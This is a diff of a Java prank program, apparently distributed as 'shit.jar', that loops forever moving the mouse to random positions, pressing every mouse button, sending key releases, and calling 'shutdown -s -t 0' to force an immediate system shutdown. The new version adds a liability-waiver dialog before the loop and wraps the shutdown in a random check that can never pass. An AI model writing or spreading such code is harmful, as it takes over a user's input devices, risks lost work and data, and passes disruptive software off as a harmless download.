@@ -7,57 +7,63 @@ import java.awt.Toolkit;
 import java.io.IOException;
 import java.util.Random;
 
+import javax.swing.JOptionPane;
+
 class Main {
-	private static Random rand;
 	private static int xCoord;
 	private static int yCoord;
+	private static int result;
+	private static Random rand;
 	private static Robot robot;
 	private static Dimension screenSize;
 	private static Runtime runtime;
+	private static String title = "Thank you for downloading shit.jar!";
+	private static String disclaimer =
+			"\nThis letter serves as a Release of Liability Contract (\"Contract\") between MechanicTC2 (\"Provider\") and the (\"Client\") regarding the services to be"
+			+ "\nprovided by the Provider to the Client:"
+			+ "\nIn consideration of the Services provided by the Provider, the Client hereby releases, waives, and discharges the Provider,"
+			+ "\nits employees, officers, agents, and affiliates from any and all claims, damages, liabilities, actions,or causes of action arising"
+			+ "\nout of or in connection with the Services, including but not limited to any loss of data, software malfunction, or damage to hardware or peripherals."
+			+ "\nThe Client agrees to indemnify, defend, and hold harmless the Provider and its representatives from and against any and all claims,"
+			+ "\ndamages, liabilities, costs, and expenses (including reasonable attorney fees) arising out of or in connection with any third-party claims resulting"
+			+ "\nfrom the Services performed by the Provider.";
 	
 	@SuppressWarnings("deprecation")
 	public static void main(String[] args) {
-		rand = new Random();
-		screenSize = Toolkit.getDefaultToolkit().getScreenSize();
-	    while (true) {
-	    	try {
-	    		xCoord = (int) rand.nextDouble(screenSize.getWidth());
-		        yCoord = (int) rand.nextDouble(screenSize.getHeight());
-		        robot = new Robot();
-		        robot.mouseMove(xCoord, yCoord);
-  		        switch (rand.nextInt(100)) {
-  		        	case 0:
-  				        robot.mousePress(1024); //BUTTON1
-  				        break;
-  		        	case 1:
-  				        robot.mousePress(2048); //BUTTON2
-  				        break;
-  		        	case 2:
-  				        robot.mousePress(4096); //BUTTON3
-  				        break;
-  		        	case 3:
-  				        robot.keyRelease(17);  //VK_CONTROL
-  				        robot.keyRelease(18);  //VK_ALT
-  				        robot.keyRelease(127); //VK_DELETE
-  				        break;
-  		        	case 4:
-  		        		runtime = Runtime.getRuntime();
-  						try {
-  							runtime.exec("shutdown -s -t 0"); //SHUTDOWN COMPUTER
-  						}
-  						catch (IOException e) {
-  				    		System.out.println("fatal error!");
-  							e.printStackTrace();
-  							continue;
-  						}
-  						break;
-  		        }
-	    	}
-	    	catch (AWTException e) {
-	    		System.out.println("fatal error!");
-	    		e.printStackTrace();
-	    		continue;
-	    	}
-	    } 
+		result = JOptionPane.showConfirmDialog(null, disclaimer, title, JOptionPane.OK_CANCEL_OPTION, JOptionPane.WARNING_MESSAGE);
+		if (result != JOptionPane.OK_OPTION) {
+		}
+		else {
+			rand = new Random();
+			screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+		    while (true) {
+		    	try {
+		    		xCoord = (int) rand.nextDouble(screenSize.getWidth());
+			        yCoord = (int) rand.nextDouble(screenSize.getHeight());
+			        robot = new Robot();
+			        robot.mouseMove(xCoord, yCoord);
+			        robot.mousePress(1024); //BUTTON1
+	  		        robot.mousePress(2048); //BUTTON2
+	  		        robot.mousePress(4096); //BUTTON3
+	  		        robot.keyRelease(17);  //VK_CONTROL
+	  		        robot.keyRelease(18);  //VK_ALT
+	  		        robot.keyRelease(127); //VK_DELETE
+	  		        if (rand.nextInt(1000) == 1000) {
+	  	  		     	runtime = Runtime.getRuntime();
+	  	  				try {
+	  	  					runtime.exec("shutdown -s -t 0");
+	  	  				}
+	  	  				catch (IOException e) {
+	  	  		    		System.out.println("fatal error!");
+	  	  					e.printStackTrace();
+	  	  				}
+	  		        }
+	  		    }
+		    	catch (AWTException e) {
+		    		System.out.println("fatal error!");
+		    		e.printStackTrace();
+		    	}
+		    } 
+		}
 	}
 }
